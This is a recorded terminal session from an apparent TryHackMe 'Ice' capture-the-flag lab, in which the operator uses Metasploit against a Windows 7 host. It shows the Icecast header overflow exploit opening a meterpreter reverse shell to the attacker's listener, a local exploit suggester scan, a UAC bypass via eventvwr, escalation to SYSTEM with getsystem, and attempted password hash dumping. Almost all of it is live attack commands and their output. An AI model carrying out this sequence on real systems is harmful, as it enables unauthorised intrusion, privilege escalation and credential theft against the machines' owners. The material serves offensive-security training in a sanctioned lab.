@@ -1,0 +1,996 @@
+Script started on 2020-11-14 11:55:23-03:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="168" LINES="36"]
+[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Ice[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Ice[00m# 
+[?2004l[?2004h]0;root@Pentest: /home/joaof/e4Sec/CTFs/TryHackMe/Ice[1;31mroot@Pentest[00m:[1;34m/home/joaof/e4Sec/CTFs/TryHackMe/Ice[00m# msfconsole
+[?2004l[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|                                                  
+[0m[36m[0m[31m
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.[0m[1mMMMM[0m[31m.oOOOOoOOOOl.[0m[1mMMMM[0m[31m,OOOOOOOOo
+  dOOOOOOOO.[0m[1mMMMMMM[0m[31m.cOOOOOc.[0m[1mMMMMMM[0m[31m,OOOOOOOOx
+  lOOOOOOOO.[0m[1mMMMMMMMMM[0m[31m;d;[0m[1mMMMMMMMMM[0m[31m,OOOOOOOOl
+  .OOOOOOOO.[0m[1mMMM[0m[31m.;[0m[1mMMMMMMMMMMM[0m[31m;[0m[1mMMMM[0m[31m,OOOOOOOO.
+   cOOOOOOO.[0m[1mMMM[0m[31m.OOc.[0m[1mMMMMM[0m[31m'oOO.[0m[1mMMM[0m[31m,OOOOOOOc
+    oOOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOOo
+     lOOOOO.[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m,OOOOOl
+      ;OOOO'[0m[1mMMM[0m[31m.OOOO.[0m[1mMMM[0m[31m:OOOO.[0m[1mMMM[0m[31m;OOOO;
+       .dOOo'[0m[1mWM[0m[31m.OOOOocccxOOOO.[0m[1mMX[0m[31m'xOOd.
+         ,kOl'[0m[1mM[0m[31m.OOOOOOOOOOOOO.[0m[1mM[0m[31m'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .[0m[0m
+
+       =[ [33mmetasploit v6.0.15-dev[0m                          ]
++ -- --=[ 2071 exploits - 1123 auxiliary - 352 post       ]
++ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: View all productivity tips with the [32mtips[0m command
+
+[?1034h[4mmsf6[0m [0m> searxh[K[Kxh[K[Kch icecast
+[0m
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/http/[45micecast[0m_header  2004-09-28       [32mgreat[0m  No     [45mIcecast[0m Header Overwrite
+
+
+Interact with a module by name or index. For example [32minfo 0[0m, [32muse 0[0m or [32muse exploit/windows/http/icecast_header[0m
+
+[4mmsf6[0m [0m> use exploit/windows/http/icecast_header
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> show info
+[0m
+       Name: Icecast Header Overwrite
+     Module: exploit/windows/http/icecast_header
+   Platform: Windows
+       Arch: 
+ Privileged: No
+    License: Metasploit Framework License (BSD)
+       Rank: Great
+  Disclosed: 2004-09-28
+
+Provided by:
+  spoonm <spoonm@no$email.com>
+  Luigi Auriemma <aluigi@autistici.org>
+
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+  RPORT   8000             yes       The target port (TCP)
+
+Payload information:
+  Space: 2000
+  Avoid: 3 characters
+
+Description:
+  This module exploits a buffer overflow in the header parsing of 
+  icecast versions 2.0.1 and earlier, discovered by Luigi Auriemma. 
+  Sending 32 HTTP headers will cause a write one past the end of a 
+  pointer array. On win32 this happens to overwrite the saved 
+  instruction pointer, and on linux (depending on compiler, etc) this 
+  seems to generally overwrite nothing crucial (read not exploitable). 
+  This exploit uses ExitThread(), this will leave icecast thinking the 
+  thread is still in use, and the thread counter won't be decremented. 
+  This means for each time your payload exits, the counter will be 
+  left incremented, and eventually the threadpool limit will be maxed. 
+  So you can multihit, but only till you fill the threadpool.
+
+References:
+  https://cvedetails.com/cve/CVE-2004-1561/
+  OSVDB (10406)
+  http://www.securityfocus.com/bid/11271
+  http://archives.neohapsis.com/archives/bugtraq/2004-09/0366.html
+
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> show options
+[0m
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.17     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> ifconfigf[K tun
+[0m[1m[34m[*][0m exec: ifconfig tun
+
+tun: erro obtendo informações da interface: dispositivo não encontrado
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> ifconfig tun0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::2237:358d:9b94:f8f0  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 9659  bytes 1030500 (1006.3 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 12627  bytes 1022236 (998.2 KiB)
+        TX errors 0  dropped 96 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> set rhosts 10.10.229.185
+[0mrhosts => 10.10.229.185
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> show options
+[0m
+Module options (exploit/windows/http/icecast_header):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.229.185    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   8000             yes       The target port (TCP)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[34m[*][0m Sending stage (175174 bytes) to 10.10.229.185
+[1m[34m[*][0m Meterpreter session 1 opened (10.9.185.104:4444 -> 10.10.229.185:49230) at 2020-11-14 12:01:02 -0300
+
+[0m[4mmeterpreter[0m > [0ms[Ksys[0minfo
+[0mComputer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > getuid
+[0mServer username: Dark-PC\Dark
+[4mmeterpreter[0m > getsystem
+[0m[1m[31m[-][0m 2001: Operation failed: This function is not supported on this system. The following was attempted:
+[1m[31m[-][0m Named Pipe Impersonation (In Memory/Admin)
+[1m[31m[-][0m Named Pipe Impersonation (Dropper/Admin)
+[1m[31m[-][0m Token Duplication (In Memory/Admin)
+[1m[31m[-][0m Named Pipe Impersonation (RPCSS variant)
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User          Path
+ ---   ----  ----                  ----  -------  ----          ----
+ 0     0     [System Process]                                   
+ 4     0     System                                             
+ 416   4     smss.exe                                           
+ 500   692   svchost.exe                                        
+ 544   536   csrss.exe                                          
+ 588   692   svchost.exe                                        
+ 592   536   wininit.exe                                        
+ 604   584   csrss.exe                                          
+ 652   584   winlogon.exe                                       
+ 692   592   services.exe                                       
+ 700   592   lsass.exe                                          
+ 708   592   lsm.exe                                            
+ 816   692   svchost.exe                                        
+ 884   692   svchost.exe                                        
+ 932   692   svchost.exe                                        
+ 1060  692   svchost.exe                                        
+ 1096  816   WmiPrvSE.exe                                       
+ 1140  692   svchost.exe                                        
+ 1188  692   svchost.exe                                        
+ 1296  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
+ 1316  1288  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
+ 1344  692   vds.exe                                            
+ 1368  692   spoolsv.exe                                        
+ 1396  692   svchost.exe                                        
+ 1440  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
+ 1540  692   amazon-ssm-agent.exe                               
+ 1636  692   LiteAgent.exe                                      
+ 1676  692   svchost.exe                                        
+ 1816  692   Ec2Config.exe                                      
+ 1912  692   svchost.exe                                        
+ 2044  692   sppsvc.exe                                         
+ 2264  1316  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
+ 2296  692   taskhost.exe                                       
+ 2588  692   SearchIndexer.exe                                  
+ 2620  816   rundll32.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\rundll32.exe
+ 2652  2620  dinotify.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\dinotify.exe
+ 2812  816   WmiPrvSE.exe                                       
+ 2848  692   TrustedInstaller.exe                               
+
+[4mmeterpreter[0m > run post/multi/recon/local_exploit_suggester
+[0m
+[1m[34m[*][0m 10.10.229.185 - Collecting local exploits for x86/windows...
+[1m[34m[*][0m 10.10.229.185 - 35 exploit checks are being tried...
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
+nil versions are discouraged and will be deprecated in Rubygems 4
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ikeext_service: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
+[1m[32m[+][0m 10.10.229.185 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[4mmeterpreter[0m > shell
+[0mProcess 2596 created.
+Channel 4 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Program Files (x86)\Icecast2 Win32>cd ..
+cd ..
+
+C:\Program Files (x86)>ls
+ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\Program Files (x86)>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECF2-DF42
+
+ Directory of C:\Program Files (x86)
+
+11/12/2019  11:15 PM    <DIR>          .
+11/12/2019  11:15 PM    <DIR>          ..
+07/13/2009  09:20 PM    <DIR>          Common Files
+11/12/2019  05:04 PM    <DIR>          Icecast2 Win32
+04/12/2011  02:17 AM    <DIR>          Internet Explorer
+11/12/2019  11:15 PM    <DIR>          Microsoft.NET
+07/13/2009  11:32 PM    <DIR>          MSBuild
+07/13/2009  11:32 PM    <DIR>          Reference Assemblies
+04/12/2011  02:17 AM    <DIR>          Windows Defender
+04/12/2011  02:17 AM    <DIR>          Windows Mail
+04/12/2011  02:17 AM    <DIR>          Windows Media Player
+07/13/2009  11:32 PM    <DIR>          Windows NT
+04/12/2011  02:17 AM    <DIR>          Windows Photo Viewer
+11/20/2010  09:31 PM    <DIR>          Windows Portable Devices
+04/12/2011  02:17 AM    <DIR>          Windows Sidebar
+               0 File(s)              0 bytes
+              15 Dir(s)  20,644,368,384 bytes free
+
+C:\Program Files (x86)>cd ,,  ..
+cd ..
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is ECF2-DF42
+
+ Directory of C:\
+
+07/13/2009  09:20 PM    <DIR>          PerfLogs
+04/12/2011  02:28 AM    <DIR>          Program Files
+11/12/2019  11:15 PM    <DIR>          Program Files (x86)
+11/12/2019  04:48 PM    <DIR>          Users
+11/12/2019  11:23 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  20,644,368,384 bytes free
+
+C:\>exit
+[4mmeterpreter[0m > sysinfo
+[0mComputer        : DARK-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > background
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> sessions -l
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information             Connection
+  --  ----  ----                     -----------             ----------
+  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.185.104:4444 -> 10.10.229.185:49230 (10.10.229.185)
+
+[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> 
+[0m[4mmsf6[0m exploit([1m[31mwindows/http/icecast_header[0m) [0m> use exploit/windows/local/bypassuac_eventvwr
+[0m[1m[34m[*][0m No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> show options
+[0m
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.0.17     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> ifconfig tun0
+[0m[1m[34m[*][0m exec: ifconfig tun0
+
+tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
+        inet 10.9.185.104  netmask 255.255.0.0  destination 10.9.185.104
+        inet6 fe80::2237:358d:9b94:f8f0  prefixlen 64  scopeid 0x20<link>
+        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (Não Especificado)
+        RX packets 10015  bytes 1095209 (1.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 13256  bytes 1619034 (1.5 MiB)
+        TX errors 0  dropped 96 overruns 0  carrier 0  collisions 0
+
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> set lhost 10.9.185.104
+[0mlhost => 10.9.185.104
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> set session 1
+[0msession => 1
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> show options
+[0m
+Module options (exploit/windows/local/bypassuac_eventvwr):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION  1                yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> exploit
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.9.185.104:4444 
+[1m[34m[*][0m UAC is Enabled, checking level...
+[1m[32m[+][0m Part of Administrators group! Continuing...
+[1m[32m[+][0m UAC is set to Default
+[1m[32m[+][0m BypassUAC can bypass this setting, continuing...
+[1m[34m[*][0m Configuring payload and stager registry keys ...
+[1m[34m[*][0m Executing payload: C:\Windows\SysWOW64\eventvwr.exe
+[1m[32m[+][0m eventvwr.exe executed successfully, waiting 10 seconds for the payload to execute.
+[1m[34m[*][0m Sending stage (175174 bytes) to 10.10.229.185
+[1m[34m[*][0m Meterpreter session 2 opened (10.9.185.104:4444 -> 10.10.229.185:49250) at 2020-11-14 12:18:54 -0300
+[0m[0m[1m[34m[*][0m Cleaning up registry keys ...
+
+[0m[4mmeterpreter[0m > getuid
+[0mServer username: Dark-PC\Dark
+[4mmeterpreter[0m > e[Kgetsy[K[Kprivs
+[0m
+Enabled Process Privileges
+==========================
+
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+[4mmeterpreter[0m > getsystem
+[0m...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > hashsump[K[K[K[Kdump
+[0m[1m[31m[-][0m 2007: Operation failed: The parameter is incorrect.
+[4mmeterpreter[0m > hashdumps
+[0m[1m[31m[-][0m Unknown command: hashdumps.
+[4mmeterpreter[0m > hashdumps[K
+[0m[1m[31m[-][0m 2007: Operation failed: The parameter is incorrect.
+[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > 
+[0m[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x64   0                                      
+ 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
+ 500   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
+ 588   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
